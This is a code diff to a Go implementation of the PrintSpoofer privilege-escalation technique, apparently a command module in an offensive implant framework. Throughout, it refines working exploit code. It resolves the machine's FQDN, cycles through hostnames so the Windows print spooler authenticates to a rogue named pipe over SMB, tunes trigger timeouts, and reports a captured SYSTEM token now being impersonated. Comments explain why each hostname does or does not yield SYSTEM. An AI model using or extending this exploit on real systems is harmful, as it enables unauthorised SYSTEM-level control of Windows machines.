@@ -32,9 +32,10 @@ type printSpooferArgs struct {
 }
 
 var (
-	winspoolDrv      = windows.NewLazySystemDLL("winspool.drv")
-	procOpenPrinterW = winspoolDrv.NewProc("OpenPrinterW")
-	procClosePrinter = winspoolDrv.NewProc("ClosePrinter")
+	winspoolDrv            = windows.NewLazySystemDLL("winspool.drv")
+	procOpenPrinterW       = winspoolDrv.NewProc("OpenPrinterW")
+	procClosePrinter       = winspoolDrv.NewProc("ClosePrinter")
+	procGetComputerNameExW = kernel32NP.NewProc("GetComputerNameExW")
 )
 
 func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
@@ -55,7 +56,9 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 
-	// Get computer name for the printer path
+	// Get computer name for the printer path.
+	// The PrintSpoofer technique requires the spooler to connect via SMB auth
+	// (not local pipe), so we need a hostname that triggers network-style resolution.
 	var compNameBuf [windows.MAX_COMPUTERNAME_LENGTH + 1]uint16
 	compNameSize := uint32(len(compNameBuf))
 	if err := windows.GetComputerName(&compNameBuf[0], &compNameSize); err != nil {
@@ -66,6 +69,16 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 		}
 	}
 	computerName := windows.UTF16ToString(compNameBuf[:compNameSize])
+
+	// Also get the DNS hostname (FQDN) for domain-joined machines
+	var dnsNameBuf [256]uint16
+	dnsNameSize := uint32(len(dnsNameBuf))
+	var dnsHostname string
+	// ComputerNameDnsFullyQualified = 3
+	ret, _, _ := procGetComputerNameExW.Call(3, uintptr(unsafe.Pointer(&dnsNameBuf[0])), uintptr(unsafe.Pointer(&dnsNameSize)))
+	if ret != 0 {
+		dnsHostname = windows.UTF16ToString(dnsNameBuf[:dnsNameSize])
+	}
 
 	// Generate a random pipe name suffix
 	var randBuf [8]byte
@@ -167,10 +180,25 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 		// IMPORTANT: OpenPrinterW uses SyscallN which blocks the OS thread.
 		// On domain-joined systems, it can block indefinitely during path resolution.
 		// Each trigger runs in a separate goroutine with a 5-second timeout.
+		// Build hostname list: computer name, FQDN (if available), localhost.
+		// The spooler must connect via SMB authentication (not local pipe) to
+		// impersonate as SYSTEM. Computer name and FQDN trigger SMB auth;
+		// localhost may connect via local path and yield NETWORK SERVICE.
 		var triggerWarnings []string
-		hostnames := []string{computerName, "localhost"}
+		hostnames := []string{computerName}
+		if dnsHostname != "" && dnsHostname != computerName {
+			hostnames = append(hostnames, dnsHostname)
+		}
+		hostnames = append(hostnames, "localhost")
+
+		// Per-trigger timeout: 10 seconds for named hostnames, 5 for localhost.
+		// OpenPrinterW on domain-joined machines can block during name resolution.
 		for _, host := range hostnames {
 			printerName := fmt.Sprintf(`\\%s/pipe/%s`, host, pipeSuffix)
+			triggerTimeout := 10 * time.Second
+			if host == "localhost" {
+				triggerTimeout = 5 * time.Second
+			}
 
 			// Run trigger in goroutine — OpenPrinterW can block the OS thread
 			triggerDone := make(chan error, 1)
@@ -178,17 +206,16 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 				triggerDone <- triggerSpooler(name)
 			}(printerName)
 
-			// Wait for trigger to complete or timeout (5s per attempt)
 			select {
 			case triggerErr := <-triggerDone:
 				if triggerErr != nil {
 					triggerWarnings = append(triggerWarnings, fmt.Sprintf("%s: %v", host, triggerErr))
 				}
-			case <-time.After(5 * time.Second):
-				triggerWarnings = append(triggerWarnings, fmt.Sprintf("%s: OpenPrinterW timed out (5s)", host))
+			case <-time.After(triggerTimeout):
+				triggerWarnings = append(triggerWarnings, fmt.Sprintf("%s: OpenPrinterW timed out (%s)", host, triggerTimeout))
 			}
 
-			// Check if spooler already connected after this trigger
+			// Check if spooler connected (1s check)
 			checkResult, _ := windows.WaitForSingleObject(event, 1000)
 			if checkResult == windows.WAIT_OBJECT_0 {
 				break // Connected!
@@ -326,8 +353,15 @@ func (c *PrintSpooferCommand) Execute(task structs.Task) structs.CommandResult {
 	var sb strings.Builder
 	sb.WriteString("=== PRINTSPOOFER SUCCESS ===\n\n")
 	sb.WriteString(fmt.Sprintf("Pipe: %s\n", pipePath))
+	sb.WriteString(fmt.Sprintf("Hostnames tried: %v\n", hostnames))
 	sb.WriteString(fmt.Sprintf("Captured identity: %s\n", clientIdentity))
 	sb.WriteString(fmt.Sprintf("Token stored — now impersonating %s\n", clientIdentity))
+	if len(triggerWarnings) > 0 {
+		sb.WriteString("\nTrigger diagnostics:\n")
+		for _, w := range triggerWarnings {
+			sb.WriteString(fmt.Sprintf("  %s\n", w))
+		}
+	}
 	sb.WriteString("\nUse 'rev2self' to revert to original identity.\n")
 	sb.WriteString("Use 'whoami' to verify current context.\n")
 
